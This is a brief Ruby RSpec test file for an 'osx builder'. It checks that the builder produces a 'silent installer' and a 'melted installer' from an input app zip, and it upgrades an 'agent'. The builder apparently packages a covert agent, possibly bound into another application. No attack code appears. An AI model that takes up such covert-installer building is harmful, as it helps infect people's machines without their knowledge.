require_relative 'shared'

module RCS::DB
  describe BuildOSX, build: true do

    shared_spec_for(:osx, melt: 'builds/melt_osx.app.zip')

    describe 'osx builder' do
      it 'should create the silent installer' do
        params = {
          'factory' => {'_id' => @factory.id},
          'binary'  => {'demo' => false},
          'melt'    => {}
        }

        subject.create(params)

        # build successful
        expect(File.size(subject.path(subject.outputs.first))).not_to eql(0)
      end

      it 'should create the melted installer' do
        params = {
          'factory' => {'_id' => @factory.id},
          'binary'  => {'demo' => false},
          'melt'    => {'input' => melt_file}
        }

        subject.create(params)

        # build successful
        expect(File.size(subject.path(subject.outputs.first))).not_to eql(0)
      end

      it 'should create the ugrade build' do
        @agent.upgrade!
      end
    end
  end
end
